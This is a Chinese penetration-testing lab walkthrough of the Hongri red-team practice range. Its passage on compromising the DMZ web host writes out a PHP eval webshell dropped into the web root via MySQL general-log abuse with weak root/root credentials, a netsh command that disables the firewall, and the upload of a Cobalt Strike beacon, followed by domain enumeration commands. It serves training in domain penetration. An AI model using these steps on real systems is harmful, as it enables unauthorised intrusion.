## **写在前面**

此实战靶场共3台主机，先把拓扑图理清楚。

win7：处于DMZ区域的web服务器，双网卡（桥接：192.168.0.101，nat：192.168.52.143）

win2K3：内网域成员主机（nat：192.168.52.141）

win2008r2：域控主机（nat：192.168.52.138）

目的就是攻击者通过拿下和外网相通的win7的shell，进而攻击win7所处域，获得域控桌面的flag，也就是敏感文件。

![v2-094dbaf3d3249f8ced0fb7cbcfea1a0b_720w.jpg](https://image.3001.net/images/20201217/1608171574_5fdac03618dc70cb9c479.jpg!small)

介绍一下：此靶场红日安全团队红队评估实战靶场第一关，难度不大，多种姿势均可获得域控权限，是练习域渗透各种姿势很不错的靶场，搭建方式也非常简单，配置一下win7为双网卡，桥接为模拟外网ip，nat模拟内网域环境。配置完双网卡即可，dhcp方式获取桥接ip。勿管nat网卡的ip，内网域环境已经搭建好了。ip配置完毕后，三台虚机密码均为hongrisec@2019。登录win7启动一下phpstudy，测试一下三台虚机连通性后即可开始本次渗透。

##  **拿下DMZ区的win7**

DMZ区也就是处于两个防火墙之间的，一个合格的DMZ区是为了提供外部主机访问内网资源服务器的一个缓冲区域，应该有着严格的内外网隔离，本次靶场只是一个模拟，dmz区并没有很合规。

那么入手以后，先进行信息收集，桥接嘛，那么直接扫一下桥接网段的存活主机，方法多多，笔者比较喜欢用nmap -sP。

也可以netdiscover -i en0 -r 192.168.0.1/24

![v2-d63812f2559540cfeece7c985e360ecf_720w.jpg](https://image.3001.net/images/20201217/1608171574_5fdac0369e65938dc13b2.jpg!small)

获取了目标ip以后，就是扫端口：

nmap -sV -vv -p1-65535 192.168.0.101

![v2-93103ca7ca371b5c2bc714454877810b_720w.jpg](https://image.3001.net/images/20201217/1608171575_5fdac0371cc371d106fa5.jpg!small)

访问80得到一个phpstudy探针。

![v2-a65c02a27d1f2da063e127499c88a70b_720w.jpg](https://image.3001.net/images/20201217/1608171575_5fdac0379fe44b7607663.jpg!small)

最下面有个测试mysql连通的。

![v2-cfb34749ebb408ae80c56052e666fa44_720w.jpg](https://image.3001.net/images/20201217/1608171576_5fdac0382110e12f48d1a.jpg!small)

输入root/root回显成功，hh 靶场嘛，很多生产环境中弱口令也是很多的。那么初步getshell思路就是通过mysql拿shell。

dirsearch扫一下目录发现存在phpmyadmin和beifen.rar

直接登录phpmyadmin页面

![v2-770a384cfe4bcbebea6ff354c8a20e31_720w.jpg](https://image.3001.net/images/20201217/1608171577_5fdac0396acb5c1713885.jpg!small)

phpmyadmin页面getshell方式有两种：

1：into_outfile写shell

条件：需要secure_file_priv为允许

![v2-a01e973f7b378b277a36e5f583ca6dba_720w.jpg](https://image.3001.net/images/20201217/1608171577_5fdac039ccc8f1f11ba20.jpg!small)

并不支持，那就尝试另一个方式，写日志getshell。

日志备份获取shell

show global variables like "%genera%"; //查询general_log配置

set global general_log='on'; 开启general log模式

SET global general_log_file='C:/phpStudy/WWW/shell.php'; //设置日志文件保存路径

SELECT '<?php @eval($_POST['w']);?>'; //phpinfo()写入日志文件

set global general_log='off'; //关闭general_log模式

shell写入成功，蚁剑连接即可。

![v2-955ba6199e2779be42ec3ad4c96b9e8e_720w.jpg](https://image.3001.net/images/20201217/1608171578_5fdac03a48095ca8fd96c.jpg!small)

成功getshell。

![v2-3564a9218d163d3cd7521007ddc96864_720w.jpg](https://image.3001.net/images/20201217/1608171578_5fdac03ae5d18b851084d.jpg!small)

那么拿shell还有另一种方法就是通过扫出来的备份文件beifen.rar，然后得yxcms的后台账号密码，登录后台getshell。yxcms拿shell方法公网上很多，这里不多赘述。主要看如何进行内网漫游。

##  **内网信息收集**

拿到shell以后，有多种选择，shell上进行信息收集，弹到msf上，弹到cs上，弹到empire上，这里选择弹到cs上。

起一个cs服务器然后客户端连接，这里笔者用的是4.0版本。

cs起一个监听，生成一个windows exe木马文件，通过蚁剑传入目标机，再执行下面这句关闭防火墙，不然目标会弹防火墙警告框。

    
    
    netsh advfirewall set allprofiles state of

shell执行一下exe即可。

![v2-cd994cc40f69495aadf29a2e49af058d_720w.jpg](https://image.3001.net/images/20201217/1608171579_5fdac03b948958c91dea6.jpg!small)

执行后成功上线，调整一下心跳，这里为纯内网练习，心跳为0即可。

beacon执行：sleep 0

![v2-04edeb53d518880251235c798c0e3fed_720w.jpg](https://image.3001.net/images/20201217/1608171580_5fdac03c14c969b8eb6c9.jpg!small)

接下来就是信息收集过程。

    
    
    ipconfig /all

![v2-2669ea7be75b342bdaef98920ca96356_720w.jpg](https://image.3001.net/images/20201217/1608171580_5fdac03c6dd8977dc83f0.jpg!small)

还发现另一个网段ip：192.168.52.143；

且当前主机是存在域内的，初步判断域名为[http://god.org](https://link.zhihu.com/?target=http%3A//god.org)；

执行：whoami，hostname

![v2-35790af54a557aaa5e1e57a1947f6206_720w.jpg](https://image.3001.net/images/20201217/1608171581_5fdac03d154fd2caa0075.jpg!small)

  

    
    
    查询系统体系架构：echo %PROCESSOR_ARCHITECTURE%

![v2-1917151305b8999b6f73d946259ba0ad_720w.jpg](https://image.3001.net/images/20201217/1608171581_5fdac03d8d3e51eb9705b.jpg!small)

  

    
    
    查询已安装的软件及版本信息：wmic product get name,version

![v2-a3325f657952e526ed048327dd47e782_720w.jpg](https://image.3001.net/images/20201217/1608171582_5fdac03e53be06c89a344.jpg!small)

  

    
    
    查看当前运行进程：wmic process list brief

![v2-e7a1ad574280a0328fbd6d420f63ca5b_720w.jpg](https://image.3001.net/images/20201217/1608171582_5fdac03eee917481656f3.jpg!small)

当前并无杀软。

关于域相关信息收集

判断当前主机是否在域内。

上篇文章已经提供了相关信息收集姿势，

这里用：net time /domain

![v2-f9fdd39a23ea7afda041fa8037dd51cc_720w.jpg](https://image.3001.net/images/20201217/1608171583_5fdac03f583243cb6885e.jpg!small)

说明当前主机确实存在域内，接下来就是确定域控ip。

查看当前域的所有用户：net user /domain

![v2-dad65a0044f70d595e9df825f4590a52_720w.jpg](https://image.3001.net/images/20201217/1608171584_5fdac0403874c16ea3869.jpg!small)

获取域内用户的详细信息：wmic useraccount get /all

![v2-22b53e5def4640879781c28f542c24dc_720w.jpg](https://image.3001.net/images/20201217/1608171584_5fdac040db405b4845405.jpg!small)

这里会回显出用户的SID，对于后续的凭据利用提前做信息收集。

查看域管理员：net group "domain controllers" /domain

![v2-39d66ceb73f81105fb5fa8894ee01b01_720w.jpg](https://image.3001.net/images/20201217/1608171585_5fdac0416b479288d0d53.jpg!small)

再进行ping域控主机即可获得域控IP：192.168.52.138

![v2-d12f9e58a54f47cbaea8fe06e2b40d1a_720w.jpg](https://image.3001.net/images/20201217/1608171585_5fdac041d8c221f1bc358.jpg!small)

查看所有域成员计算机列表：net group "domain computers" /domain

![v2-6d1b9d00b10b2cf4d1535f87659bd482_720w.jpg](https://image.3001.net/images/20201217/1608171586_5fdac042486cd7785b695.jpg!small)

查看本地管理组：net localgroup administrators /domain

![v2-2a7cb0abed448cce0c78354474df4d66_720w.jpg](https://image.3001.net/images/20201217/1608171586_5fdac042dfb404f1af429.jpg!small)

查看本地所有用户：net user

![v2-0b48705d7f9cb47e305e962c0eaa88a1_720w.jpg](https://image.3001.net/images/20201217/1608171587_5fdac043858c650b40dc7.jpg!small)

CS也有个探测内网环境功能，这里进行如下选择：

![v2-a0ad1ae000ed99d10ebc78c0c51e8209_720w.jpg](https://image.3001.net/images/20201217/1608171588_5fdac044089db570bbc6c.jpg!small)

  

查看目标得知以下内容，获知当前内网主机列表，这里通过初步探测，141和143为域内主机，138为域内域控。

![v2-fb95309da0e5b5bb0a9ad54c581e1eac_720w.jpg](https://image.3001.net/images/20201217/1608171588_5fdac0447bfac961c5690.jpg!small)

也可以通过Ladon这个域信息收集神器来进行存活主机探测。

CS4.0脚本管理器导入Ladon.cna即可，下载地址如下：

    
    
    https://github.com/rsmudge/ElevateKit

用法：Ladon 192.168.52.0/24 OsScan

Ladon是一个非常了不起的内网信息收集工具。

使用方法详情见官方文档：[http://k8gege.org/p/648af4b3.html](https://link.zhihu.com/?target=http%3A//k8gege.org/p/648af4b3.html)

![v2-86a70c94a4eb8bbabea5eafc0153e974_720w.jpg](https://image.3001.net/images/20201217/1608171589_5fdac0452c32b22dbc937.jpg!small)

会显示出非常详细的信息，例如版本以及是否为虚拟机。后续可以使用BloodHound进行测绘攻击路线。

##  **内网横向移动**

到这里为止，我们已经确定了此靶场的域控ip以及域内基本拓扑图，接下来就是设置代理进行横向移动打域控，对于此靶场来说，获取域控权限方式很多，下一期拿这个靶场进行域内漫游的方法小合集，拿到域控主机桌面的flag。

